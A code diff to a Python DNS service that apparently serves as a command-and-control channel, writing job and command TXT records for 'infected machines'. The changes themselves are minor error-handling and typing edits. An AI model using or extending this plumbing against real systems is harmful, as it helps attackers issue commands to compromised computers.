@@ -1,5 +1,6 @@
 import base64
 import os
+import traceback
 from typing import Self
 
 import dns
@@ -19,8 +20,9 @@ class DnsService:
                 key_name: os.environ.get('DNS_ZONE_KEY'),
             })
             self.updater = Update("data.tm-it.fr", keyring=self.keyring, keyname=dns.name.from_text(key_name))
-        except TypeError:
-            pass
+        except Exception as e:
+            print(e)
+            traceback.print_exc()
 
     def set_job_txt(self, machine: InfectedMachine, txt_value: str) -> Self:
         if self.updater is None: return self
@@ -35,8 +37,8 @@ class DnsService:
         self.updater.delete(f'cmd.{machine.dns_identifier}')
         return self
 
-    def apply(self):
-        if self.updater is None: return self
+    def apply(self) -> None:
+        if self.updater is None: return
 
         print("DNS: about to send update", flush=True)
         response = dns.query.tcp(self.updater, "127.0.0.1")
